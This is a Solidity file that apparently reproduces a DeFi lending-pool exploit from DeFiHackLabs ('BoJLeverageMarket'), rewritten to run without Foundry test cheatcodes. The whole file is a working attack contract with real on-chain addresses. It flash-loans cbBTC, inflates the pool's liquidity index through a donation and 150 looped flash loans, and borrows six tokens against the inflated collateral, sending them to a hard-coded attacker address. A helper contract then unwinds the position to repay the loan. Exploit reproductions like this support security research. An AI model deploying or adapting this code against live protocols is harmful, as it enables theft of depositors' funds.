// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// BoJLeverageMarket_exp.sol test's attack logic verbatim, but without
// inheriting forge-std Test/BaseTestWithBalanceLog (which depends on the
// Foundry cheatcode contract at 0x7109709E... being deployed; that address
// has no code in a plain EVM replay, so any cheatcode-gated modifier reverts
// on EXTCODESIZE before the real attack call ever runs). The bare
// IERC20Min/IBoJPool/IMorphoBuleFlashLoan interfaces below replace
// TokenHelper's cheatcode-backed helpers, and `execute()` (called directly,
// no `ContractTest` wrapper) is the real attack entrypoint.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IBoJPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
}

interface IMorphoBuleFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract BoJAttack {
    address public constant ATTACKER = 0xdf4089d9845C87ed8FD109bD724f30339C2d0B7B;
    address public constant BOJ_POOL = 0x0B326E95e6EA0b50284b3e44b750fda4b4364E82;
    address public constant BOJ_CBBTC_ATOKEN = 0x51C4547A7b1739f6b226b24AcC33D8F6F7596cbB;
    address public constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    IERC20Min public constant CBBTC = IERC20Min(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);
    IERC20Min public constant WETH_TOKEN = IERC20Min(0x4200000000000000000000000000000000000006);
    IERC20Min public constant USDC_TOKEN = IERC20Min(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20Min public constant AERO_TOKEN = IERC20Min(0x940181a94A35A4569E4529A3CDfB74e38FD98631);
    IERC20Min public constant MORPHO_TOKEN = IERC20Min(0xBAa5CC21fd487B8Fcc2F632f3F4E8D37262a0842);
    IERC20Min public constant DEGEN_TOKEN = IERC20Min(0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed);
    IERC20Min public constant VIRTUAL_TOKEN = IERC20Min(0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b);

    IBoJPool public constant pool = IBoJPool(0x0B326E95e6EA0b50284b3e44b750fda4b4364E82);
    IMorphoBuleFlashLoan public constant morpho = IMorphoBuleFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    function execute() external {
        morpho.flashLoan(address(CBBTC), 10_537_110_432, "");
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "only Morpho");

        CBBTC.approve(BOJ_POOL, type(uint256).max);

        // step 1: create one unit of scaled cbBTC supply in the BoJ reserve.
        pool.deposit(address(CBBTC), 100, address(this), 0);
        pool.withdraw(address(CBBTC), 99, address(this));

        // step 2: donate cbBTC and repeatedly flash-loan it to compound fees into the liquidity index.
        CBBTC.transfer(BOJ_CBBTC_ATOKEN, 7_024_740_288);
        for (uint256 i = 0; i < 150; i++) {
            _bojFlashLoan(7_024_740_288);
        }

        // step 3: borrow all trace profit assets against the inflated cbBTC collateral value.
        _borrowAndForward(WETH_TOKEN, 521_472_358_420_158);
        _borrowAndForward(USDC_TOKEN, 1_267_769_327);
        _borrowAndForward(AERO_TOKEN, 3_206_293_935_581_265_143_878);
        _borrowAndForward(MORPHO_TOKEN, 232_423_631_596_475_387_317);
        _borrowAndForward(DEGEN_TOKEN, 109_893_180_044_731_784_967_907);
        _borrowAndForward(VIRTUAL_TOKEN, 1_112_544_981_282_161_707_685);

        // step 4: use a fresh helper to unwind enough inflated cbBTC collateral to repay Morpho.
        BoJRecoveryHelper helper = new BoJRecoveryHelper();
        CBBTC.approve(address(helper), type(uint256).max);
        helper.recover();

        CBBTC.approve(MORPHO, assets);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == BOJ_POOL, "only BoJ pool");
        CBBTC.approve(BOJ_POOL, amounts[0] + premiums[0]);
        assets;
        return true;
    }

    function _bojFlashLoan(uint256 amount) private {
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);
        assets[0] = address(CBBTC);
        amounts[0] = amount;
        pool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function _borrowAndForward(IERC20Min token, uint256 amount) private {
        pool.borrow(address(token), amount, 2, 0, address(this));
        token.transfer(ATTACKER, amount);
    }
}

contract BoJRecoveryHelper {
    address public constant BOJ_POOL = 0x0B326E95e6EA0b50284b3e44b750fda4b4364E82;
    IERC20Min public constant CBBTC = IERC20Min(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

    function recover() external {
        CBBTC.transferFrom(msg.sender, address(this), 1_053_289_502);
        CBBTC.approve(BOJ_POOL, type(uint256).max);

        poolDeposit(1_053_289_502);
        poolWithdraw(789_967_125);

        for (uint256 i = 0; i < 29; i++) {
            poolDeposit(526_644_751);
            poolWithdraw(789_967_125);
        }

        poolDeposit(526_644_751);
        poolWithdraw(705_214_071);

        CBBTC.transfer(msg.sender, CBBTC.balanceOf(address(this)));
    }

    function poolDeposit(uint256 amount) private {
        IBoJPool(BOJ_POOL).deposit(address(CBBTC), amount, address(this), 0);
    }

    function poolWithdraw(uint256 amount) private {
        IBoJPool(BOJ_POOL).withdraw(address(CBBTC), amount, address(this));
    }
}
